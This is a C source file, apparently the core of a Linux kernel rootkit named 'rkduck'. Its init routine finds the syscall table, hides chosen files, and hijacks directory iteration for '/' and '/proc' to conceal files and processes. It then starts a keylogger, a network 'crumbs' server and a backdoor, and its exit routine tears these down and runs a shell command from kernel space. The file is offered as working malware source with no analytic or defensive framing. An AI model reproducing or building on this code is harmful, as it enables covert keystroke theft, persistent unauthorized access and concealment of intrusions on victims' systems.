#include "duck.h"

ptr_t* sys_call_table = NULL;
struct hidden_file h_file;

int duck_init(void) {
    dbg("rkduck: loaded\n");

    if ((sys_call_table = (ptr_t *) find_syscall_table())) {
        dbg("rkduck: sys_call_table found at %p\n", sys_call_table);
    } else {
        dbg("rkduck: sys_call_table not found, aborting\n");
        return 0;
    }

    // set_page_rw((ptr_t) sys_call_table);
    // original_write = xchg(&sys_call_table[__NR_write], duck_write);
    // set_page_ro((ptr_t) sys_call_table);

    vfs_hide_file("/root/rkduck/rkduck/rkduck_dir");
    vfs_hide_file(str_remove_duplicates("///tmp////rklol"));
    // vfs_hide_file(str_remove_duplicates("/tmp"));
    printk("rkduck: %s\n", str_remove_duplicates("///tmp////"));
    
    vfs_original_iterate = vfs_get_iterate("/");
    vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);
    vfs_hijack_start(vfs_original_iterate);
    
    vfs_original_proc_iterate = vfs_get_iterate("/proc");
    vfs_save_hijacked_function_code(vfs_original_proc_iterate, vfs_hijacked_proc_iterate);
    vfs_hijack_start(vfs_original_proc_iterate);

    keylogger_init();
    crumbs_serv_init();
    backdoor();
    //persistence();

    return 0;
}

void duck_exit(void) {

    keylogger_release();
    crumbs_serv_release();
    backdoor_exit();

    char *argv[] = { "/bin/bash", "-c", FOREVER_STOP, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    // kfree(h_file.path);

    vfs_hijack_stop(vfs_original_iterate);
    vfs_hijack_stop(vfs_original_proc_iterate);
    
    // set_page_rw((ptr_t) sys_call_table);
    // xchg(&sys_call_table[__NR_write], original_write);
    // set_page_ro((ptr_t) sys_call_table);

    dbg("rkduck: unloaded\n");
}